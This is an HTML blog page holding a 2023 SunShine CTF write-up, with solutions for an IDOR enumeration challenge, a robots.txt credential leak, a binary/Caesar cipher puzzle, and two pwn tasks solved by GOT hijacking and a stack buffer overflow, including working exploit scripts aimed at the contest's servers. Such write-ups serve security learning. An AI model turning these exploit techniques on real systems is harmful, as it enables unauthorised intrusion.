@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Team Name:WANRank:74Link:https:&#x2F;&#x2F;2023.sunshinectf.org&#x2F;teams&#x2F;295   WEBBeepBoop Blog Slover: 堇姬naup   You can observe a suspicious URL, which has patterns.You can get something by using different number">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 SunShine CTF Write Up">
+<meta property="og:url" content="http://wha13.github.io/2023/10/14/sunshinectf/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Team Name:WANRank:74Link:https:&#x2F;&#x2F;2023.sunshinectf.org&#x2F;teams&#x2F;295   WEBBeepBoop Blog Slover: 堇姬naup   You can observe a suspicious URL, which has patterns.You can get something by using different number">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJOJcfx-6.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1gm2MebT.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByfNfNx-a.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJSGz4g-a.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByMTCXe-p.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJYDJ4lbp.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyC1-4xZT.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkd-x7gbp.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1_FJ7xWa.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJYMbmlZp.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJaocml-a.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryjdDmgZ6.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJNqbVMZp.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1OxMNfZ6.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkEwzEfWp.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJ3J7NGWp.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk-xIEz-p.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkjCHEf-6.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJK3QnM-p.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BydIJ6GZp.png">
+<meta property="article:published_time" content="2023-10-15T01:35:39.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Cryptography">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="WAN">
+<meta property="article:tag" content="Classical cipher">
+<meta property="article:tag" content="GOT Hijacking">
+<meta property="article:tag" content="SunShine CTF">
+<meta property="article:tag" content="Forensics">
+<meta property="article:tag" content="Scripting">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/HJOJcfx-6.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2023 SunShine CTF Write Up</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/25/apcs202310/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/12/pwn-note/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/10/14/sunshinectf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/10/14/sunshinectf/&text=2023 SunShine CTF Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/10/14/sunshinectf/&is_video=false&description=2023 SunShine CTF Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 SunShine CTF Write Up&body=Check out this article: http://wha13.github.io/2023/10/14/sunshinectf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/10/14/sunshinectf/&title=2023 SunShine CTF Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/10/14/sunshinectf/&name=2023 SunShine CTF Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/10/14/sunshinectf/&t=2023 SunShine CTF Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BeepBoop-Blog"><span class="toc-number">1.0.1.</span> <span class="toc-text">BeepBoop Blog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-wh00ps-4ll-IDOR"><span class="toc-number">1.0.2.</span> <span class="toc-text">FLAG:sun{wh00ps_4ll_IDOR}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hotdog-Stand"><span class="toc-number">1.1.</span> <span class="toc-text">Hotdog Stand</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-5l1c3d-p1cKl35-4nd-0N10N2"><span class="toc-number">1.1.1.</span> <span class="toc-text">FLAG:sun{5l1c3d_p1cKl35_4nd_0N10N2}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">2.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BeepBoop-Cryptography"><span class="toc-number">2.1.</span> <span class="toc-text">BeepBoop Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-exterminate-exterminate-exterminate"><span class="toc-number">2.1.1.</span> <span class="toc-text">FLAG:sun{exterminate-exterminate-exterminate}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%98%8E-Array-of-Sunshine-%E2%98%80%EF%B8%8F"><span class="toc-number">4.1.</span> <span class="toc-text">😎 Array of Sunshine ☀️</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#slove-script"><span class="toc-number">4.1.1.</span> <span class="toc-text">slove script:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag"><span class="toc-number">4.1.2.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flock-of-Seagulls-%F0%9F%95%8A%EF%B8%8F"><span class="toc-number">4.2.</span> <span class="toc-text">Flock of Seagulls 🕊️</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#slove-script-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">slove script:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bug-Spray-%F0%9F%90%9B%F0%9F%AA%B2%F0%9F%90%9E"><span class="toc-number">4.3.</span> <span class="toc-text">Bug Spray 🐛🪲🐞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#slove-script-2"><span class="toc-number">4.3.1.</span> <span class="toc-text">slove script:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-2"><span class="toc-number">4.3.2.</span> <span class="toc-text">Flag:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scripting"><span class="toc-number">5.</span> <span class="toc-text">Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DDR"><span class="toc-number">5.1.</span> <span class="toc-text">DDR</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#slove-script-3"><span class="toc-number">5.1.1.</span> <span class="toc-text">slove script:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag-3"><span class="toc-number">5.1.2.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimonProgrammer-1"><span class="toc-number">5.2.</span> <span class="toc-text">SimonProgrammer 1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reversing"><span class="toc-number">6.</span> <span class="toc-text">Reversing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dill"><span class="toc-number">6.1.</span> <span class="toc-text">Dill</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K"><span class="toc-number">6.1.1.</span> <span class="toc-text">FLAG:sun{ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K}</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#After-the-End"><span class="toc-number"></span> <span class="toc-text">After the End</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">1.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-Effort-Wav-%F0%9F%8C%8A"><span class="toc-number">1.1.</span> <span class="toc-text">Low Effort Wav 🌊</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FLAG-sun-well-that-was-low-effort"><span class="toc-number">1.1.1.</span> <span class="toc-text">FLAG:sun{well_that_was_low_effort}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reversing-1"><span class="toc-number">2.</span> <span class="toc-text">Reversing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#First-Date"><span class="toc-number">2.1.</span> <span class="toc-text">First Date</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scripting-1"><span class="toc-number">3.</span> <span class="toc-text">Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SimonProgrammer-2"><span class="toc-number">3.1.</span> <span class="toc-text">SimonProgrammer 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimonProgrammer-3"><span class="toc-number">3.2.</span> <span class="toc-text">SimonProgrammer 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Knowledge-Repository"><span class="toc-number">4.1.</span> <span class="toc-text">Knowledge Repository</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-Sus"><span class="toc-number">5.1.</span> <span class="toc-text">House of Sus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Robot-Assembly-Line"><span class="toc-number">5.2.</span> <span class="toc-text">Robot Assembly Line</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2023 SunShine CTF Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-15T01:35:39.000Z" class="dt-published" itemprop="datePublished">2023-10-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Classical-cipher/" rel="tag">Classical cipher</a>, <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/Forensics/" rel="tag">Forensics</a>, <a class="p-category" href="/tags/GOT-Hijacking/" rel="tag">GOT Hijacking</a>, <a class="p-category" href="/tags/ROP/" rel="tag">ROP</a>, <a class="p-category" href="/tags/Scripting/" rel="tag">Scripting</a>, <a class="p-category" href="/tags/SunShine-CTF/" rel="tag">SunShine CTF</a>, <a class="p-category" href="/tags/WAN/" rel="tag">WAN</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Team Name:WAN<br>Rank:74<br><a target="_blank" rel="noopener" href="https://2023.sunshinectf.org/teams/295">Link:https://2023.sunshinectf.org/teams/295</a>  </p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="BeepBoop-Blog"><a href="#BeepBoop-Blog" class="headerlink" title="BeepBoop Blog"></a>BeepBoop Blog</h4><hr>
+<p>Slover: <code>堇姬naup</code>  </p>
+<p>You can observe a suspicious URL, which has patterns.<br>You can get something by using different numbers after the URL path <code>/post/</code><br><code>https://beepboop.web.2023.sunshinectf.games/post/1</code>  </p>
+<p><img src="https://hackmd.io/_uploads/HJOJcfx-6.png">  </p>
+<p>I guess the flag may be hidden in one of the paths.  </p>
+<p><strong>Solve Script</strong>  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99999</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    web = requests.get(<span class="string">&#x27;https://beepboop.web.2023.sunshinectf.games/post/&#123;&#125;/&#x27;</span>.<span class="built_in">format</span>(i), verify=<span class="literal">False</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;sun&#123;&#x27;</span> <span class="keyword">in</span> web.text:</span><br><span class="line">        <span class="built_in">print</span>(web.text)   </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>It can make requests starting from 0 and check whether there is a flag in it.  </p>
+<p><img src="https://hackmd.io/_uploads/H1gm2MebT.png">  </p>
+<p>Get FLAG!!  </p>
+<h4 id="FLAG-sun-wh00ps-4ll-IDOR"><a href="#FLAG-sun-wh00ps-4ll-IDOR" class="headerlink" title="FLAG:sun{wh00ps_4ll_IDOR}"></a>FLAG:<code>sun&#123;wh00ps_4ll_IDOR&#125;</code></h4><h3 id="Hotdog-Stand"><a href="#Hotdog-Stand" class="headerlink" title="Hotdog Stand"></a>Hotdog Stand</h3><hr>
+<p>Solver: <code>Whale120</code>     </p>
+<p>The challenge is a simple login page, after some tries on sql injection, the official release an information about challenge fixing(while I was on flask-unsign……).<br>After fixed, we can get <code>/hotdog-database/</code>from<code>robots.txt</code>, and we can see username and password in it, LOL!  </p>
+<h4 id="FLAG-sun-5l1c3d-p1cKl35-4nd-0N10N2"><a href="#FLAG-sun-5l1c3d-p1cKl35-4nd-0N10N2" class="headerlink" title="FLAG:sun{5l1c3d_p1cKl35_4nd_0N10N2}"></a>FLAG:<code>sun&#123;5l1c3d_p1cKl35_4nd_0N10N2&#125;</code></h4><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="BeepBoop-Cryptography"><a href="#BeepBoop-Cryptography" class="headerlink" title="BeepBoop Cryptography"></a>BeepBoop Cryptography</h3><hr>
+<p>Solver: <code>Whale120</code><br>text:<br><code>beep beep beep beep boop beep boop beep beep boop boop beep beep boop boop beep beep boop boop beep boop beep beep beep beep boop boop beep beep beep beep boop beep boop boop boop boop beep boop boop beep boop boop boop beep beep boop beep beep boop boop beep boop beep boop boop beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop beep beep boop beep boop beep boop boop boop boop beep boop beep beep boop boop boop beep boop boop beep beep boop boop beep beep beep beep boop beep boop boop beep boop boop boop beep beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep beep boop beep boop boop beep boop beep boop boop boop beep beep boop beep beep boop boop beep boop beep boop boop beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop beep beep boop beep boop beep boop boop boop boop beep boop beep beep boop boop boop beep boop boop beep beep boop boop beep beep beep beep boop beep boop boop beep boop boop boop beep beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep beep boop beep boop boop beep boop beep boop boop boop beep beep boop beep beep boop boop beep boop beep boop boop beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop beep beep boop beep boop beep boop boop boop boop beep boop beep beep boop boop boop beep boop boop beep beep boop boop beep beep beep beep boop beep boop boop beep boop boop boop beep beep boop boop beep beep boop boop boop beep boop boop boop beep beep boop beep beep boop boop boop boop boop beep boop</code>  </p>
+<p>turn it into 0&#x2F;1, and decode with binary, would get something like this:<br><code>fha&#123;rkgrezvangr-rkgrezvangr-rkgrezvangr&#125;</code><br>Caeser cipher decrypt:  </p>
+<h4 id="FLAG-sun-exterminate-exterminate-exterminate"><a href="#FLAG-sun-exterminate-exterminate-exterminate" class="headerlink" title="FLAG:sun{exterminate-exterminate-exterminate}"></a>FLAG:<code>sun&#123;exterminate-exterminate-exterminate&#125;</code></h4><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="😎-Array-of-Sunshine-☀️"><a href="#😎-Array-of-Sunshine-☀️" class="headerlink" title="😎 Array of Sunshine ☀️"></a>😎 Array of Sunshine ☀️</h3><hr>
+<p><img src="https://hackmd.io/_uploads/ByfNfNx-a.png"><br><img src="https://hackmd.io/_uploads/BJSGz4g-a.png"><br>We can see an obvious bug <code>scanf(&quot;%s&quot;,&amp;fruit[v1])</code><br>and It didn’t check if <code>v1</code> is out of index<br>Also protection is <code>Partial RELRO</code> and fruit is a global variable.<br>So we know it has a <strong>GOT hijack</strong>  </p>
+<p>There is a win function which will <strong>$cat flag</strong><br>and when <code>print_sym !=MEMORY[0x404020]</code> at the same time <code>MEMORY[0x404020]</code> is <code>0x6</code> (known by gdb)  </p>
+<p>I gonna hijack <code>exit@got[plt]</code> to win function<br>Because of <strong>NO-PIE</strong> we know  <code>exit@got[plt]</code> at <code>0x405040</code>, <code>fruit</code> at <code>0x405080</code> (It means <code>exit@got[plt]</code> is at <code>fruit[-8]</code>)  </p>
+<h4 id="slove-script"><a href="#slove-script" class="headerlink" title="slove script:"></a>slove script:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;/data&#x27;</span>)</span><br><span class="line">sys.path.append(<span class="string">&#x27;/home/aukro/pwnbox/data&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> tool.template <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">init(<span class="number">64</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">r = nc(<span class="string">&#x27;nc chal.2023.sunshinectf.games 23003&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x40128f</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">r.sendline(p64(win))</span><br><span class="line">end()</span><br></pre></td></tr></table></figure>
+<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag:"></a>Flag:</h4><p><code>sun&#123;a_ray_of_sunshine_bouncing_around&#125;</code>  </p>
+<h3 id="Flock-of-Seagulls-🕊️"><a href="#Flock-of-Seagulls-🕊️" class="headerlink" title="Flock of Seagulls 🕊️"></a>Flock of Seagulls 🕊️</h3><hr>
+<p><img src="https://hackmd.io/_uploads/ByMTCXe-p.png"><br>With IDA decompiling I found out a function call chain<br><code>main-&gt;fun1-&gt;fun2-&gt;fun3-&gt;fun4-&gt;fun5</code><br>also it has a ret adr check chain (didn’t check fuc1-&gt;main)<br><code>fun5-&gt;fun4-&gt;fun3-&gt;fun2-&gt;fun1-x&gt;main</code><br>and a backdoor function call <code>win</code>  </p>
+<p><img src="https://hackmd.io/_uploads/SJYDJ4lbp.png"><br>It gave us <code>rsp</code> and also has a huge <code>BOF</code><br>with <code>No PIE</code> we can just write back the <code>ret adr</code> to bypass the check<br>and write <code>func1&#39;s ret adr</code> to <code>win</code>  </p>
+<p>I also use gdb to help me write bypass payload more easily<br><img src="https://hackmd.io/_uploads/HyC1-4xZT.png">  </p>
+<h4 id="slove-script-1"><a href="#slove-script-1" class="headerlink" title="slove script:"></a>slove script:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;/data&#x27;</span>)</span><br><span class="line">sys.path.append(<span class="string">&#x27;/home/aukro/pwnbox/data&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> tool.template <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">init(<span class="number">64</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">r = nc(<span class="string">&#x27;nc chal.2023.sunshinectf.games 23002&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;At &#x27;</span>)</span><br><span class="line">a = r.recvline().strip()</span><br><span class="line"></span><br><span class="line">rsp = <span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line">rbp = rsp+<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rsp))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">128</span>+ p64(rbp+<span class="number">0x20</span>) + p64(<span class="number">0x401276</span>) +<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+ p64(rbp+<span class="number">0x40</span>) + p64(<span class="number">0x4012a0</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(rbp+<span class="number">0x60</span>) +p64(<span class="number">0x4012ca</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> +p64(rbp+<span class="number">0x70</span>) +p64(<span class="number">0x4012f0</span>) +<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x4011bd</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag:"></a>Flag:</h4><p><code>sun&#123;here_then_there_then_everywhere&#125;</code>  </p>
